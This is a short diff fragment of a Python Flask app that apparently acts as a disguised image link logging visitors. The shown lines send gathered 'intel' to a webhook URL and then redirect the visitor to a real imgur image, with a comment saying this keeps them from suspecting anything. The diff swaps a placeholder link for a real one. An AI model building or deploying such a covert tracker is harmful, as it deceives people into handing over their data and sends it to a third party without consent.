@@ -37,7 +37,7 @@ def capture_metadata(id):
     requests.post(WEBHOOK_URL, json=intel)
 
     # Final Redirect: Send them to the actual image so they don't suspect a thing
-    return redirect("https://i.imgur.com/actual_image_link.png")
+    return redirect("https://i.imgur.com/BcNs5vF.jpg")
 
 if __name__ == "__main__":
     app.run(host='0.0.0.0', port=80)
